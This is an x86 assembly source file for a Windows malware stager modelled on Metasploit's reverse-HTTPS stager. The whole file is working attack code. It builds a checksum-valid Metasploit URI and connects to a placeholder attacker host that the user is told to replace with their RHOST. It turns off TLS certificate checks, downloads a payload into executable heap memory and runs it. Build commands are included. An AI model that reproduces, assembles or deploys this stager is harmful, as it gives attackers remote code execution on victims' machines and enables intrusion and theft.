extern ExitProcess
extern InternetSetOptionA
extern InternetOpenA
extern InternetConnectA
extern InternetReadFile
extern HttpOpenRequestA
extern HttpSendRequestA
extern HeapCreate
extern HeapAlloc
extern GetSystemTimeAsFileTime
extern CryptBinaryToStringA

; Compiles with the following
; nasm.exe -f win32 -o objectFile.obj .\code.asm
; GoLink.exe /dynamicbase /nxcompat /fo executable.exe .\objectFile.obj kernel32.dll wininet.dll Crypt32.dll


segment .data
Host db 'samplehost.example.com',0     ;replace this with your RHOST
Port dw  443                           ;replace this with your RPORT
UUID times 75 db 0
base64URI times 100 db 0
lowTime db 0
highTime db 0

segment .text

global Start
Start:
.genUUID:       ;generate the UUID
    mov ebx,UUID
    rdrand eax
    mov [ebx],eax
    add ebx,4
    rdrand eax
    mov [ebx],eax   ;Generating the UUID follows the documentation on the metasploit framework
    add ebx,4
    rdrand eax
    mov[ebx],ax
    add ebx,2
    xor ecx,ecx
    mov cl,ah
    xor ecx,1
    mov [ebx],cl
    inc ebx
    xor ecx,ecx
    mov cl,al
    xor ecx,1
    mov [ebx],cl
    inc ebx
    mov ecx,[ebx-6]
    mov cx,[ebx-4]
    bswap ecx
    push ebx
    push ecx
    push lowTime
    call [GetSystemTimeAsFileTime]
    pop ecx
    pop ebx
    xor ecx,[highTime]
    mov [ebx],ecx

.base64E:
    push UUID
    call .strlen
    mov ecx,eax
    push 0
    mov ebx,esp
    push ecx        
    push ebx        ;pointer to base 64 string length
    push 0          ;NULL, this will return the encoded length to our pointer
    push 0x00000001 ;CRYPT_STRING_BASE64
    push ecx        ;UUID length
    push UUID       ;Pointer to UUID
    call [CryptBinaryToStringA]
    pop ecx         
    push ebx            ;pointer to base 64 encoded length set from previous call
    push base64URI      ;pointer to buffer for output
    push 0x00000001     ;CRYPT_STRING_BASE64
    push ecx            ;UUID length
    push UUID           ;UUID
    call [CryptBinaryToStringA]
    
.validURI:              ;Check for valid URI base, must not contain / or +
    push base64URI      ;which are valid base64 but not valid in a uri
    call .base64Len
    mov DWORD [ecx],0
    push 0x2f
    push base64URI
    call .strContains
    cmp eax,0
    jne .clearURIandRestart
    push 0x2b
    push base64URI
    call .strContains
    cmp eax,0
    jne .clearURIandRestart
    jmp .appendRandom       ;URI must be longer than it is now, jump to 
                            ;append junk data until it meets a length requirement

.URIChecksum:           ;Check that the sum, modulus by 0x100 == 0x92, if it does jump to stage
    push base64URI
    call .sumURI
    mov ecx,eax
    xor edx,edx
    mov ebx,0x100
    idiv ebx
    cmp edx,92
    je .stage

.appendURI:             ;This function tests if the required byte to meet the checksum
    mov ebx,92          ;is a valid character, if it is just append that and jump back
    sub ebx,edx         ;to the URI checksum test
    xor eax,eax
    mov al,bl
    push eax
    push eax
    call .isBase64Char
    pop ecx
    cmp eax,1
    jne .appendRandom
    mov eax,base64URI
.appendURIFindEndLoop:
    cmp BYTE[eax],0
    je .appendURIFindEndLoopEnd
    inc eax
    jmp .appendURIFindEndLoop
.appendURIFindEndLoopEnd:
    mov BYTE [eax], cl
    jmp .URIChecksum
    
    
.appendRandom:          ;Append a random valid base64 character until the lenght is greater than 34
    rdrand ecx
    push ecx
    call .isBase64Char
    cmp eax,1
    jne .appendRandom
    mov eax,base64URI
.appendRandomFindEndLoop:
    cmp BYTE[eax],0
    je .appendRandomFindEndLoopEnd
    inc eax
    jmp .appendRandomFindEndLoop
.appendRandomFindEndLoopEnd:
    mov BYTE [eax], cl
    push base64URI
    call .strlen
    cmp eax,34
    jle .appendRandom
    jmp .URIChecksum

.clearURIandRestart:  ;This function runs if the base url is invalid, it simply zeroes out the UUID and base64URL
    push 75           ;then it will jump to the entry point
    push UUID
    call .zeroURI
    push 100
    push base64URI
    call .zeroURI
    jmp .genUUID
    
    
    

.stage:
mov ebx,10
mov ecx,0
.internetOpen:
    cmp ecx,ebx
    jg .exit
    push ebx
    push ecx
    push dword 0
    mov eax,0
    push esp
    push 0
    push 0
    push 0
    call [InternetOpenA]
    pop ecx
    pop ebx
    inc ecx
    cmp eax,0 ;Compare output to 0 and exit if failed
    jz .internetOpen

.internetConnect:
    push 0
    mov ebx,esp
    push ebx
    push 0x0
    push byte 3 ;INTERNET_SERVICE_HTTP
    push 0
    push 0
    push DWORD [Port]
    push DWORD Host
    push eax
    call [InternetConnectA]
    cmp eax,0 ;Compare output to 0 and exit if failed
    jz .exit

.httpOpenRequest:
    push 0
    push esp
    ;push 2227450624
    push 0x84C43300
    push 0
    push 0
    push 0
    push DWORD base64URI
    push 0
    push eax
    call [HttpOpenRequestA]
    cmp eax,0 ;Compare output to 0 and exit if failed
    jz .exit

.internetSetOptionA:
    push 0x001380 ;SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION
    mov ebx,esp
    push eax
    push 4
    push ebx
    push 31 ;INTERNET_OPTION_SECURITY_FLAGS
    push eax
    call [InternetSetOptionA]
    cmp eax,0 ;Compare output to 0 and exit if failed
    jz .exit
    mov eax,[esp]
    
.httpSendRequest:
    push 0
    push 0
    push 0
    push 0
    push eax
    call [HttpSendRequestA]
    cmp eax,0 ;Compare output to 0 and exit if failed
    jz .exit


.heapCreate:
    push 0
    push 300000
    push 0x00040000 ; HEAP_CREATE_ENABLE_EXECUTE
    call [HeapCreate]


.heapAlloc:
    push 300000
    push 8 ; HEAP_ZERO_MEMORY
    push eax
    call [HeapAlloc]
    

    
.copyBytes:
    pop edx ;Copy request handle to edx
    mov ecx,eax
    push 0    ;bytes read
    mov ebx,esp    ;pointer to bytes read
    
.loop:
    pushad
    push ebx
    push 1024
    push ecx    ; location to store data
    push edx    ; internet handle to read from
    call [InternetReadFile]
    popad
    add ecx,[ebx]
    cmp DWORD [ebx],1024
    je .loop
    
.run:
    call eax


.exit:
    push dword 0
    call [ExitProcess]
    
.strlen:
    xor eax,eax
    pop ebx
    pop ecx
.strlenLoopStart:
    inc ecx
    inc eax
    cmp BYTE [ecx],0
    jne .strlenLoopStart
    push ebx
    ret

.base64Len:
    xor eax,eax
    pop ebx
    pop ecx
.base64LenLoopStart:
    inc ecx
    inc eax
    cmp BYTE [ecx],0x0D
    je .base64LenLoopEnd
    cmp BYTE [ecx],0x0A
    je .base64LenLoopEnd
    cmp BYTE [ecx],0x3D
    je .base64LenLoopEnd
    jmp .base64LenLoopStart
.base64LenLoopEnd:
    push ebx
    ret

.strContains:
    xor eax,eax
    pop ebx
    pop ecx
    pop edx
.strContainsLoopStart:
    cmp BYTE [ecx],dl
    je .exitStrContainsFail
    inc ecx
    cmp BYTE[ecx],0
    je .exitStrContainsSuccess
    jmp .strContainsLoopStart
.exitStrContainsFail:
    inc eax
.exitStrContainsSuccess:
    push ebx
    ret

.zeroURI:
    pop ebx
    pop ecx
    pop edx
    xor eax,eax
.zeroStartURI:
    mov BYTE [ecx],0x0
    inc eax
    inc ecx
    cmp eax,edx
    jne .zeroStartURI
    push ebx
    ret
    
.sumURI:
    pop ebx
    xor eax,eax
    pop ecx
.sumURILoop:
    xor edx,edx
    mov dl,BYTE [ecx]
    add eax,edx
    inc ecx
    cmp BYTE [ecx],0
    jne .sumURILoop
    push ebx
    ret
    
.isBase64Char:
    pop ebx
    pop ecx
    mov eax,1
.isBase64CharNum:
    cmp cl,0x7a
    jg .isBase64CharFalse
    cmp cl,0x61
    jge .isBase64CharTrue
    cmp cl,0x5a
    jg .isBase64CharFalse
    cmp cl,0x41
    jge .isBase64CharTrue
    cmp cl,0x39
    jg .isBase64CharFalse
    cmp cl,0x30
    jge .isBase64CharTrue
.isBase64CharFalse:
    mov eax,0
.isBase64CharTrue:
    push ebx
    ret
